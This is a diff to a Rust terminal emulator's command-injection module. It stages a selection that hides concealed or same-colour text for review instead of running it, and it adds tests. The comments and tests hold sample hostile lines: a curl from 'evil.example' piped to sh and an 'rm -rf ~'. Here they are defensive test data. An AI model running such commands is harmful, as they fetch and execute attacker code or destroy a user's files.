@@ -15,6 +15,8 @@
 //!   inert data; only our own accept-line executes);
 //! * multiline → TYPE (bracketed, NO `\r`): the shell's own paste buffer is the
 //!   review step — the user's Enter is the confirmation, zero modal UI;
+//! * a selection covering text the user could not see (SGR 8, or drawn in its
+//!   own background color) → TYPE even on one line (`stage_if_hidden`);
 //! * multiline without bracketed paste is NEVER written raw (interior newlines
 //!   would execute lines 1..n-1 immediately) — it waits, and is REFUSED at TTL;
 //! * an UNBRACKETED write converts `\t` → space (a raw tab triggers readline
@@ -225,6 +227,20 @@ pub fn classify(s: Sanitized) -> Plan {
     }
 }
 
+/// A selection covering text the user could not see — concealed (SGR 8) or
+/// drawn in its own background color, invisible inside the selection highlight
+/// too (`Terminal::selection_hides_text`) — never runs unread: `echo hello`
+/// followed by a concealed `; curl … | sh` would run both. A single line is
+/// staged like a multi-line one instead; the new tab's shell shows all of it,
+/// and the user's Enter runs it. The same as pasting the copied selection,
+/// which never runs anything by itself either.
+pub fn stage_if_hidden(plan: Plan, hides_text: bool) -> Plan {
+    match plan {
+        Plan::Run(t) if hides_text => Plan::Type(t),
+        p => p,
+    }
+}
+
 /// Vertical box-drawing characters that TUI frames (Claude Code's bordered
 /// blocks, `boxes`, `gum`…) put at the left/right edge of every framed row. A
 /// selection that spans such rows drags the border in — and a command that
@@ -333,6 +349,9 @@ pub struct PendingInject {
     /// The window that hosted the trigger, for feedback pills (refusal /
     /// staged notice). `None` = main window.
     pub notify_window: Option<winit::window::WindowId>,
+    /// The selection covered text the user could not see, so a single line was
+    /// staged ([`stage_if_hidden`]): the staged pill says why.
+    pub hides_text: bool,
 }
 
 impl PendingInject {
@@ -369,6 +388,9 @@ pub const MSG_REFUSED: &str =
 /// Pill text when a Type-mode pending landed staged (multiline or truncated):
 /// nothing ran; the user's Enter is the confirmation.
 pub const MSG_STAGED: &str = "Selection staged — review, then press Enter to run";
+
+/// [`MSG_STAGED`] for a selection staged because it covered hidden text.
+pub const MSG_HIDDEN: &str = "Selection has hidden text — staged: review it, then press Enter";
 
 /// Pill text when a single-line pending hit its TTL — the tab is open at the
 /// right cwd, but nothing ran and nothing will (a late fire is forbidden).
@@ -781,6 +803,28 @@ mod tests {
         assert_eq!(classify(sanitize("   \n\t \n")), Plan::Empty);
     }
 
+    #[test]
+    fn a_selection_with_hidden_text_is_staged_never_run() {
+        // `echo hello` + a concealed `; curl … | sh` on one line: the user saw
+        // only the first command, so nothing may run before they read it all.
+        let line = || classify(prepare("echo hello; curl -s https://evil.example/x | sh"));
+        assert_eq!(stage_if_hidden(line(), true), Plan::Type("echo hello; curl -s https://evil.example/x | sh".into()));
+        assert_eq!(stage_if_hidden(line(), false), line(), "all of it visible: runs as before");
+        assert_eq!(stage_if_hidden(classify(prepare("a\nb")), true), Plan::Type("a\nb".into()));
+        assert_eq!(stage_if_hidden(Plan::Empty, true), Plan::Empty);
+    }
+
+    #[test]
+    fn a_hidden_text_selection_reaches_the_pty_staged() {
+        // Staged = no `\r`: the shell shows the whole line and waits for Enter.
+        let Plan::Type(text) = stage_if_hidden(classify(prepare("echo hi; rm -rf ~")), true) else {
+            panic!("not staged");
+        };
+        let mut w: Vec<u8> = Vec::new();
+        assert!(fire_pending(&mut w, &text, false, true).unwrap());
+        assert_eq!(w, b"\x1b[200~echo hi; rm -rf ~\x1b[201~");
+    }
+
     // ── poll_pending ─────────────────────────────────────────────────────────
 
     fn pending(text: &str, run: bool, created: Instant, wait_for_mark: bool) -> PendingInject {
@@ -790,6 +834,7 @@ mod tests {
             created,
             wait_for_mark,
             notify_window: None,
+            hides_text: false,
         }
     }
 
